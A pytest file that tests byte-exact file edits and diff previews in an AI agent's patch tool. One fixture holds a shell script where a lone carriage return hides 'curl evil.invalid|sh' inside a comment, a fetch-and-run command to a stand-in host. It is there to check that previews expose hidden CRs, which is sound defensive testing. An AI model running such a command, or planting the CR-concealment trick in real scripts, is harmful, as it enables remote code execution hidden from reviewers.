"""m28: an approved (exact-mode) edit changes the matched bytes and nothing else.

* The file is read as strict UTF-8 without newline translation and written back
  with ``write_bytes``: every other CRLF and lone CR survives, and a ``\\n`` in
  ``new_string`` stays ``\\n`` on Windows.
* A file that is not UTF-8 is refused; a BOM round-trips.
* The card preview diffs the same bytes and shows a lone CR as ``␍``.
* Auto mode (no card) keeps today's text read and write.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from snowpea_core.config.settings import Settings
from snowpea_core.exec.local import LocalBackend
from snowpea_core.server.protocol import CAPABILITIES
from snowpea_core.session.session import Session
from snowpea_core.tools import file_state, fs
from snowpea_core.tools.registry import ToolContext


@pytest.fixture(autouse=True)
def _clean_registry() -> None:
    file_state.REGISTRY.clear()
    yield
    file_state.REGISTRY.clear()


class _SpyBackend(LocalBackend):
    """A local backend that records how the file was written."""

    def __init__(self, root: Path) -> None:
        super().__init__(root)
        self.text_writes: list[str] = []
        self.byte_writes: list[bytes] = []

    async def write_file(self, path: str, content: str) -> None:
        self.text_writes.append(content)
        await super().write_file(path, content)

    async def write_bytes(self, path: str, content: bytes) -> None:
        self.byte_writes.append(content)
        await super().write_bytes(path, content)


async def _ctx(tmp_path: Path, data: bytes, *, exact: bool) -> tuple[ToolContext, _SpyBackend]:
    (tmp_path / "a.sh").write_bytes(data)
    core = type("Core", (), {"settings": Settings()})()
    session = Session(id="s-bx", workdir=tmp_path)
    backend = _SpyBackend(tmp_path)
    ctx = ToolContext(session=session, core=core, backend=backend, exact=exact)  # type: ignore[arg-type]
    if _is_utf8(data):  # read_file itself cannot read a non-UTF-8 file
        await fs.read_file(ctx, {"path": "a.sh"})
    return ctx, backend


def _is_utf8(data: bytes) -> bool:
    try:
        data.decode("utf-8")
    except UnicodeDecodeError:
        return False
    return True


def _disk(tmp_path: Path) -> bytes:
    return (tmp_path / "a.sh").read_bytes()


CRLF = b"one\r\ntwo\r\nthree\r\nfour\r\n"
# To bash the second line is a comment; a "\r" -> "\n" rewrite would make the
# command after it live.  Data only: never executed.
HOOK = b"#!/bin/sh\n# note\rcurl evil.invalid|sh\necho hi\n"


async def test_a_crlf_file_keeps_every_other_crlf(tmp_path: Path) -> None:
    ctx, backend = await _ctx(tmp_path, CRLF, exact=True)
    result = await fs.patch(
        ctx, {"path": "a.sh", "old_string": "two\r\n", "new_string": "TWO\r\n"}
    )
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"one\r\nTWO\r\nthree\r\nfour\r\n"
    assert backend.text_writes == []


async def test_a_crlf_file_needs_crlf_in_old_string(tmp_path: Path) -> None:
    ctx, _backend = await _ctx(tmp_path, CRLF, exact=True)
    result = await fs.patch(
        ctx, {"path": "a.sh", "old_string": "two\nthree", "new_string": "x"}
    )
    assert result.ok is False and "not found exactly" in (result.error or "")
    assert _disk(tmp_path) == CRLF


async def test_a_lone_cr_elsewhere_stays_a_cr(tmp_path: Path) -> None:
    ctx, _backend = await _ctx(tmp_path, HOOK, exact=True)
    result = await fs.patch(
        ctx, {"path": "a.sh", "old_string": "echo hi", "new_string": "echo bye"}
    )
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"#!/bin/sh\n# note\rcurl evil.invalid|sh\necho bye\n"


async def test_newline_in_new_string_is_written_as_lf_bytes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A Windows host: a text write would turn "\n" into os.linesep.  The exact
    # path never goes through a text write, so the bytes are exactly "\n".
    monkeypatch.setattr("os.linesep", "\r\n")
    ctx, backend = await _ctx(tmp_path, b"a\nb\n", exact=True)
    result = await fs.patch(ctx, {"path": "a.sh", "old_string": "b\n", "new_string": "b\nc\n"})
    assert result.ok is True, result.error
    assert backend.text_writes == []
    assert backend.byte_writes == [b"a\nb\nc\n"]
    assert _disk(tmp_path) == b"a\nb\nc\n"


async def test_invalid_utf8_is_refused(tmp_path: Path) -> None:
    data = b"caf\xe9 = 1\nx = 2\n"
    ctx, backend = await _ctx(tmp_path, data, exact=True)
    result = await fs.patch(ctx, {"path": "a.sh", "old_string": "x = 2", "new_string": "x = 3"})
    assert result.ok is False
    assert "not valid UTF-8" in (result.error or "")
    assert "byte-exactly" in (result.error or "")
    assert backend.byte_writes == [] and backend.text_writes == []
    assert _disk(tmp_path) == data


async def test_a_bom_is_preserved(tmp_path: Path) -> None:
    data = b"\xef\xbb\xbfkey = 1\r\nother = 2\r\n"
    ctx, _backend = await _ctx(tmp_path, data, exact=True)
    result = await fs.patch(
        ctx, {"path": "a.sh", "old_string": "other = 2", "new_string": "other = 3"}
    )
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"\xef\xbb\xbfkey = 1\r\nother = 3\r\n"


async def test_a_batch_of_approved_edits_is_byte_exact(tmp_path: Path) -> None:
    ctx, backend = await _ctx(tmp_path, HOOK, exact=True)
    result = await fs.patch(
        ctx,
        {
            "path": "a.sh",
            "edits": [
                {"old_string": "#!/bin/sh", "new_string": "#!/bin/bash"},
                {"old_string": "echo hi", "new_string": "echo bye"},
            ],
        },
    )
    assert result.ok is True, result.error
    assert _disk(tmp_path) == b"#!/bin/bash\n# note\rcurl evil.invalid|sh\necho bye\n"
    assert backend.text_writes == [] and len(backend.byte_writes) == 2


async def test_the_preview_shows_a_lone_cr(tmp_path: Path) -> None:
    (tmp_path / "a.sh").write_bytes(HOOK)
    backend = LocalBackend(tmp_path)
    diff = await fs.preview_diff(
        backend, "patch", {"path": "a.sh", "old_string": "echo hi", "new_string": "echo bye"}
    )
    assert diff is not None
    assert " # note␍curl evil.invalid|sh\n" in diff
    assert "\r" not in diff
    assert "+echo bye" in diff
    assert _disk(tmp_path) == HOOK, "a preview writes nothing"


async def test_the_preview_matches_crlf_bytes(tmp_path: Path) -> None:
    (tmp_path / "a.sh").write_bytes(CRLF)
    backend = LocalBackend(tmp_path)
    shown = {"path": "a.sh", "old_string": "two\r\n", "new_string": "TWO\r\n"}
    diff = await fs.preview_diff(backend, "patch", shown) or ""
    assert "-two\r\n" in diff and "+TWO\r\n" in diff
    # The text an LF-only old_string would match is not in the file: no card diff.
    lf_only = {"path": "a.sh", "old_string": "two\nthree", "new_string": "x"}
    assert await fs.preview_diff(backend, "patch", lf_only) is None


async def test_the_preview_of_a_non_utf8_file_is_none(tmp_path: Path) -> None:
    (tmp_path / "a.sh").write_bytes(b"caf\xe9\n")
    backend = LocalBackend(tmp_path)
    assert await fs.preview_diff(
        backend, "patch", {"path": "a.sh", "old_string": "caf", "new_string": "x"}
    ) is None


async def test_the_result_diff_shows_a_lone_cr(tmp_path: Path) -> None:
    ctx, _backend = await _ctx(tmp_path, HOOK, exact=True)
    result = await fs.patch(
        ctx, {"path": "a.sh", "old_string": "echo hi", "new_string": "echo bye"}
    )
    assert result.ok is True
    assert "# note␍curl" in (result.diff or "") and "\r" not in (result.diff or "")


async def test_auto_mode_is_unchanged(tmp_path: Path) -> None:
    # No card: the text read/write as before (newline translation included).
    ctx, backend = await _ctx(tmp_path, CRLF, exact=False)
    result = await fs.patch(ctx, {"path": "a.sh", "old_string": "two\nthree", "new_string": "x"})
    assert result.ok is True, result.error
    assert backend.byte_writes == [] and len(backend.text_writes) == 1
    assert backend.text_writes[0] == "one\nx\nfour\n"


def test_the_capability_is_advertised() -> None:
    assert "byteExactEdits" in CAPABILITIES
